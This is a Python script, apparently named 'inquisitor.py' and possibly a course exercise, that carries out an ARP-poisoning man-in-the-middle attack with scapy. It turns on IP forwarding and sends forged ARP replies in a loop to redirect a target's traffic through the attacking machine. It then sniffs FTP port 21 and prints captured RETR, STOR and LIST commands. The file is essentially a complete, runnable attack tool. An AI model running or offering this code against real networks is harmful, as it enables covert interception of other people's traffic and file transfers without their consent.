import sys
import os
import threading
import time
from scapy.all import ARP, Ether, sendp, sniff, Raw, TCP

def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP forwarding enabled")



def poison_target(ip_src, mac_src, ip_target, mac_target, attacker_mac):
    try:
        print("[*] Sending forged ARP replies...")
        while True:
            pkt = Ether(dst=mac_target) / ARP(
                op=2,
                pdst=ip_target,
                hwdst=mac_target,
                psrc=ip_src,
                hwsrc=attacker_mac
            )
            sendp(pkt, iface="eth0", verbose=False)  # USE sendp() instead of send()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Restoring ARP...")
        restore_arp(ip_src, mac_src, ip_target, mac_target)


def restore_arp(ip_src, mac_src, ip_target, mac_target):
    pkt = Ether(dst=mac_target) / ARP(
        op=2,
        pdst=ip_target,
        hwdst=mac_target,
        psrc=ip_src,
        hwsrc=mac_src
    )
    sendp(pkt, count=5, iface="eth0", verbose=False)
    print("[*] Restored ARP entry for target.")

def sniff_ftp():
    print("[*] Sniffing FTP traffic on port 21...")
    def process(pkt):
        if pkt.haslayer(Raw) and pkt.haslayer(TCP):
            data = pkt[Raw].load
            if b'RETR' in data or b'STOR' in data or b'LIST' in data:
                print(f"[FTP] {data.decode(errors='ignore').strip()}")
    sniff(filter="tcp port 21", prn=process, store=0)

def main():
    if len(sys.argv) != 5:
        print("Usage: sudo python3 inquisitor.py <IP-src> <MAC-src> <IP-target> <MAC-target>")
        sys.exit(1)

    ip_src = sys.argv[1]
    mac_src = sys.argv[2]
    ip_target = sys.argv[3]
    mac_target = sys.argv[4]

    # Detect attacker MAC from eth0 (adjust if needed)
    attacker_mac = os.popen("cat /sys/class/net/eth0/address").read().strip()
    print(f"[*] Attacker MAC: {attacker_mac}")

    enable_ip_forwarding()

    # Thread 1: Poisoning
    t1 = threading.Thread(target=poison_target, args=(ip_src, mac_src, ip_target, mac_target, attacker_mac))
    # Thread 2: Packet sniffing
    t2 = threading.Thread(target=sniff_ftp)

    t1.start()
    t2.start()

    t1.join()
    t2.join()

if __name__ == "__main__":
    main()
